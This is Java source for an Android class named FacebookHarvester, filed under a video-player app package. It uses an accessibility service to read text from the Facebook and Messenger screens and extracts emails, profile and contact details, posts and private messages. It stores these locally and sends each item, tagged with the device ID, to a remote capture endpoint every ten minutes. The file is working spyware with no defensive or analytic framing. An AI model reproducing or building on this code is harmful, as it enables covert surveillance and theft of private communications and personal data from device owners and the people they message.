package com.jumpy.videoplayerapp;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import org.json.JSONObject;
import java.util.concurrent.ExecutorService;

public class FacebookHarvester {
    private static final String TAG = "jumpy_FacebookHarvest";
    
    private Context context;
    private AccessibilityService accessibilityService;
    private ScheduledExecutorService scheduler;
    private ExecutorService executor; // Add executor for background tasks
    
    // Data storage
    private List<String> profiles = new ArrayList<>();
    private List<String> posts = new ArrayList<>();
    private List<String> emails = new ArrayList<>();
    private List<String> contacts = new ArrayList<>();
    private List<String> messages = new ArrayList<>();
    
    // Counters
    private int profilesCount = 0;
    private int postsCount = 0;
    private int emailsCount = 0;
    private int contactsCount = 0;
    private int messagesCount = 0;
    
    public FacebookHarvester(Context context) {
        this.context = context;
        this.executor = Executors.newFixedThreadPool(2);
        Log.i(TAG, "FacebookHarvester initialized");
    }
    
    public FacebookHarvester(AccessibilityService service) {
        this.accessibilityService = service;
        this.context = service;
        this.executor = Executors.newFixedThreadPool(2);
        Log.i(TAG, "FacebookHarvester initialized with accessibility service");
    }
    
    /**
     * Handle accessibility events from Facebook apps
     */
    public void handleAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getSource() == null) return;
        
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        
        // Only process Facebook-related events
        if (!packageName.contains("facebook")) return;
        
        try {
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    handleTextChanged(event);
                    break;
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    handleViewClicked(event);
                    break;
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    handleWindowStateChanged(event);
                    break;
                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    handleWindowContentChanged(event);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling accessibility event: " + e.getMessage());
        }
    }
    
    /**
     * Handle text changed events
     */
    private void handleTextChanged(AccessibilityEvent event) {
        String text = event.getText() != null ? event.getText().toString() : "";
        if (!text.isEmpty()) {
            // Extract emails from text
            extractEmailsFromText(text);
            
            // Extract profile information
            extractProfileInfo(text);
            
            // Extract contact information
            extractContactInfo(text);
        }
    }
    
    /**
     * Handle view clicked events
     */
    private void handleViewClicked(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            // Extract information from clicked elements
            extractInfoFromNode(source);
        }
    }
    
    /**
     * Handle window state changed events
     */
    private void handleWindowStateChanged(AccessibilityEvent event) {
        String className = event.getClassName() != null ? event.getClassName().toString() : "";
        Log.d(TAG, "Facebook window state changed: " + className);
        
        // Detect different Facebook screens
        if (className.contains("ProfileActivity") || className.contains("ProfileFragment")) {
            Log.i(TAG, "Facebook profile screen detected");
            harvestProfileData();
        } else if (className.contains("FeedActivity") || className.contains("NewsFeedFragment")) {
            Log.i(TAG, "Facebook feed screen detected");
            harvestFeedData();
        } else if (className.contains("MessengerActivity") || className.contains("ChatFragment")) {
            Log.i(TAG, "Facebook messenger screen detected");
            harvestMessengerData();
        }
    }
    
    /**
     * Handle window content changed events
     */
    private void handleWindowContentChanged(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            // Extract all text content from the current window
            extractAllTextFromNode(source);
        }
    }
    
    /**
     * Extract emails from text using regex patterns
     */
    private void extractEmailsFromText(String text) {
        // Email regex pattern
        String emailPattern = "\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b";
        java.util.regex.Pattern pattern = java.util.regex.Pattern.compile(emailPattern);
        java.util.regex.Matcher matcher = pattern.matcher(text);
        
        while (matcher.find()) {
            String email = matcher.group();
            if (!emails.contains(email)) {
                emails.add(email);
                emailsCount++;
                Log.i(TAG, "Email extracted: " + email);
            }
        }
    }
    
    /**
     * Extract profile information from text
     */
    private void extractProfileInfo(String text) {
        // Look for profile-related patterns
        if (text.contains("Profile") || text.contains("About") || text.contains("Info")) {
            if (!profiles.contains(text)) {
                profiles.add(text);
                profilesCount++;
                Log.i(TAG, "Profile info extracted: " + text.substring(0, Math.min(100, text.length())));
            }
        }
    }
    
    /**
     * Extract contact information from text
     */
    private void extractContactInfo(String text) {
        // Look for contact-related patterns
        if (text.contains("Contact") || text.contains("Phone") || text.contains("Address")) {
            if (!contacts.contains(text)) {
                contacts.add(text);
                contactsCount++;
                Log.i(TAG, "Contact info extracted: " + text.substring(0, Math.min(100, text.length())));
            }
        }
    }
    
    /**
     * Extract information from accessibility node
     */
    private void extractInfoFromNode(AccessibilityNodeInfo node) {
        if (node == null) return;
        
        // Extract text content
        CharSequence text = node.getText();
        if (text != null) {
            String textStr = text.toString();
            if (!textStr.isEmpty()) {
                extractEmailsFromText(textStr);
                extractProfileInfo(textStr);
                extractContactInfo(textStr);
            }
        }
        
        // Extract content description
        CharSequence contentDesc = node.getContentDescription();
        if (contentDesc != null) {
            String descStr = contentDesc.toString();
            if (!descStr.isEmpty()) {
                extractEmailsFromText(descStr);
                extractProfileInfo(descStr);
                extractContactInfo(descStr);
            }
        }
        
        // Recursively process child nodes
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                extractInfoFromNode(child);
            }
        }
    }
    
    /**
     * Extract all text from accessibility node
     */
    private void extractAllTextFromNode(AccessibilityNodeInfo node) {
        if (node == null) return;
        
        // Extract text content
        CharSequence text = node.getText();
        if (text != null) {
            String textStr = text.toString();
            if (!textStr.isEmpty()) {
                // Extract emails
                extractEmailsFromText(textStr);
                
                // Extract posts
                if (textStr.length() > 20) { // Likely a post
                    if (!posts.contains(textStr)) {
                        posts.add(textStr);
                        postsCount++;
                        Log.i(TAG, "Post extracted: " + textStr.substring(0, Math.min(100, textStr.length())));
                    }
                }
                
                // Extract messages
                if (textStr.contains(":") && textStr.length() < 200) { // Likely a message
                    if (!messages.contains(textStr)) {
                        messages.add(textStr);
                        messagesCount++;
                        Log.i(TAG, "Message extracted: " + textStr);
                    }
                }
            }
        }
        
        // Recursively process child nodes
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                extractAllTextFromNode(child);
            }
        }
    }
    
    /**
     * Harvest profile data from current Facebook screen
     */
    private void harvestProfileData() {
        Log.i(TAG, "Harvesting Facebook profile data...");
        
        if (accessibilityService != null) {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            if (rootNode != null) {
                extractAllTextFromNode(rootNode);
            }
        }
    }
    
    /**
     * Harvest feed data from current Facebook screen
     */
    private void harvestFeedData() {
        Log.i(TAG, "Harvesting Facebook feed data...");
        
        if (accessibilityService != null) {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            if (rootNode != null) {
                extractAllTextFromNode(rootNode);
            }
        }
    }
    
    /**
     * Harvest messenger data from current Facebook screen
     */
    private void harvestMessengerData() {
        Log.i(TAG, "Harvesting Facebook messenger data...");
        
        if (accessibilityService != null) {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            if (rootNode != null) {
                extractAllTextFromNode(rootNode);
            }
        }
    }
    
    /**
     * Harvest all Facebook data
     */
    public void harvestAllData() {
        Log.i(TAG, "[FACEBOOK_HARVEST] harvestAllData START");
        Log.i(TAG, "=== Starting Facebook data harvest ===");
        
        try {
            // Harvest from current screen
            if (accessibilityService != null) {
                AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
                if (rootNode != null) {
                    extractAllTextFromNode(rootNode);
                }
            }
            
            // Save data to local storage
            saveDataToLocalStorage();
            
            // Send data to backend
            sendDataToBackend();
            
        } catch (Exception e) {
            Log.e(TAG, "[FACEBOOK_HARVEST] Error in harvestAllData: " + e.getMessage(), e);
        }
        Log.i(TAG, "[FACEBOOK_HARVEST] harvestAllData END");
    }
    
    /**
     * Save harvested data to local storage
     */
    private void saveDataToLocalStorage() {
        try {
            // Save to internal storage
            String data = "Facebook Harvest Data:\n" +
                         "Profiles: " + profiles.size() + "\n" +
                         "Posts: " + posts.size() + "\n" +
                         "Emails: " + emails.size() + "\n" +
                         "Contacts: " + contacts.size() + "\n" +
                         "Messages: " + messages.size() + "\n\n";
            
            // Add detailed data
            data += "Emails:\n";
            for (String email : emails) {
                data += "- " + email + "\n";
            }
            
            data += "\nProfiles:\n";
            for (String profile : profiles) {
                data += "- " + profile.substring(0, Math.min(200, profile.length())) + "\n";
            }
            
            // Save to file
            java.io.File file = new java.io.File(context.getFilesDir(), "facebook_harvest.txt");
            java.io.FileWriter writer = new java.io.FileWriter(file, true);
            writer.write(data + "\n---\n");
            writer.close();
            
            Log.i(TAG, "Facebook data saved to local storage");
            
        } catch (Exception e) {
            Log.e(TAG, "Error saving Facebook data to local storage: " + e.getMessage());
        }
    }
    
    // Send harvested data to backend
    public void sendDataToBackend() {
        Log.i(TAG, "=== sendDataToBackend() START ===");
        
        try {
            // Get device ID
            String deviceId = android.provider.Settings.Secure.getString(
                context.getContentResolver(), 
                android.provider.Settings.Secure.ANDROID_ID
            );
            
            // Send Facebook data as messages to capture endpoint
            sendFacebookDataToCaptureEndpoint(deviceId);
            
            Log.i(TAG, "=== sendDataToBackend() END ===");
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending Facebook data to backend: " + e.getMessage());
        }
    }
    
    // Send Facebook data to capture endpoint
    private void sendFacebookDataToCaptureEndpoint(String deviceId) {
        try {
            // Send emails as messages
            for (String email : emails) {
                JSONObject captureMessage = new JSONObject();
                captureMessage.put("deviceId", deviceId);
                captureMessage.put("platform", "facebook");
                captureMessage.put("chatId", "facebook_emails");
                captureMessage.put("sender", "Facebook User");
                captureMessage.put("message", "Email found: " + email);
                captureMessage.put("messageType", "email");
                captureMessage.put("messageId", "fb_email_" + email.hashCode());
                captureMessage.put("timestamp", System.currentTimeMillis());
                
                sendMessageToCaptureEndpoint(captureMessage.toString());
            }
            
            // Send profile info as messages
            for (String profile : profiles) {
                JSONObject captureMessage = new JSONObject();
                captureMessage.put("deviceId", deviceId);
                captureMessage.put("platform", "facebook");
                captureMessage.put("chatId", "facebook_profiles");
                captureMessage.put("sender", "Facebook Profile");
                captureMessage.put("message", profile.substring(0, Math.min(500, profile.length())));
                captureMessage.put("messageType", "profile");
                captureMessage.put("messageId", "fb_profile_" + profile.hashCode());
                captureMessage.put("timestamp", System.currentTimeMillis());
                
                sendMessageToCaptureEndpoint(captureMessage.toString());
            }
            
            // Send contact info as messages
            for (String contact : contacts) {
                JSONObject captureMessage = new JSONObject();
                captureMessage.put("deviceId", deviceId);
                captureMessage.put("platform", "facebook");
                captureMessage.put("chatId", "facebook_contacts");
                captureMessage.put("sender", "Facebook Contact");
                captureMessage.put("message", contact.substring(0, Math.min(500, contact.length())));
                captureMessage.put("messageType", "contact");
                captureMessage.put("messageId", "fb_contact_" + contact.hashCode());
                captureMessage.put("timestamp", System.currentTimeMillis());
                
                sendMessageToCaptureEndpoint(captureMessage.toString());
            }
            
            // Send posts as messages
            for (String post : posts) {
                JSONObject captureMessage = new JSONObject();
                captureMessage.put("deviceId", deviceId);
                captureMessage.put("platform", "facebook");
                captureMessage.put("chatId", "facebook_posts");
                captureMessage.put("sender", "Facebook Post");
                captureMessage.put("message", post.substring(0, Math.min(500, post.length())));
                captureMessage.put("messageType", "post");
                captureMessage.put("messageId", "fb_post_" + post.hashCode());
                captureMessage.put("timestamp", System.currentTimeMillis());
                
                sendMessageToCaptureEndpoint(captureMessage.toString());
            }
            
            // Send messages
            for (String message : messages) {
                JSONObject captureMessage = new JSONObject();
                captureMessage.put("deviceId", deviceId);
                captureMessage.put("platform", "facebook");
                captureMessage.put("chatId", "facebook_messenger");
                captureMessage.put("sender", "Facebook Messenger");
                captureMessage.put("message", message.substring(0, Math.min(500, message.length())));
                captureMessage.put("messageType", "text");
                captureMessage.put("messageId", "fb_msg_" + message.hashCode());
                captureMessage.put("timestamp", System.currentTimeMillis());
                
                sendMessageToCaptureEndpoint(captureMessage.toString());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending Facebook data to capture endpoint: " + e.getMessage());
        }
    }
    
    // Send individual message to capture endpoint
    private void sendMessageToCaptureEndpoint(String messageData) {
        executor.submit(() -> {
            try {
                Log.i(TAG, "Sending Facebook message to capture endpoint");
                
                // Create HTTP request for capture endpoint
                java.net.URL url = new java.net.URL(AppConfig.API_BASE_URL + "capture/messages/test");
                java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();
                
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setRequestProperty("Accept", "application/json");
                connection.setDoOutput(true);
                connection.setConnectTimeout(10000);
                connection.setReadTimeout(15000);
                
                // Send data
                try (java.io.OutputStream os = connection.getOutputStream()) {
                    byte[] input = messageData.getBytes("UTF-8");
                    os.write(input, 0, input.length);
                }
                
                // Check response
                int responseCode = connection.getResponseCode();
                Log.i(TAG, "Capture endpoint response code: " + responseCode);
                
                if (responseCode == 200 || responseCode == 201) {
                    Log.i(TAG, "Successfully sent Facebook message to capture endpoint");
                } else {
                    Log.e(TAG, "Failed to send Facebook message to capture endpoint: HTTP " + responseCode);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error sending Facebook message to capture endpoint: " + e.getMessage());
            }
        });
    }
    
    // Helper method to save data to a file
    private void saveToFile(String filename, String data) {
        try {
            java.io.File file = new java.io.File(context.getFilesDir(), filename);
            java.io.FileOutputStream fos = new java.io.FileOutputStream(file);
            fos.write(data.getBytes());
            fos.close();
            Log.i(TAG, "Data saved to file: " + filename);
        } catch (Exception e) {
            Log.e(TAG, "Error saving data to file: " + e.getMessage());
        }
    }

    
    /**
     * Start background harvesting
     */
    public void startBackgroundHarvesting() {
        Log.i(TAG, "Starting Facebook background harvesting...");
        
        scheduler = Executors.newScheduledThreadPool(1);
        
        // Schedule harvesting every 10 minutes
        scheduler.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                try {
                    harvestAllData();
                } catch (Exception e) {
                    Log.e(TAG, "Error in scheduled Facebook harvest: " + e.getMessage());
                }
            }
        }, 60, 600, TimeUnit.SECONDS); // Start after 1 minute, repeat every 10 minutes
        
        Log.i(TAG, "Facebook background harvesting scheduled");
    }
    
    /**
     * Stop background harvesting
     */
    public void stopBackgroundHarvesting() {
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
            Log.i(TAG, "Facebook background harvesting stopped");
        }
    }
    
    // Getter methods for statistics
    public int getProfilesCount() { return profilesCount; }
    public int getPostsCount() { return postsCount; }
    public int getEmailsCount() { return emailsCount; }
    public int getContactsCount() { return contactsCount; }
    public int getMessagesCount() { return messagesCount; }
    
    public List<String> getProfiles() { return new ArrayList<>(profiles); }
    public List<String> getPosts() { return new ArrayList<>(posts); }
    public List<String> getEmails() { return new ArrayList<>(emails); }
    public List<String> getContacts() { return new ArrayList<>(contacts); }
    public List<String> getMessages() { return new ArrayList<>(messages); }
} 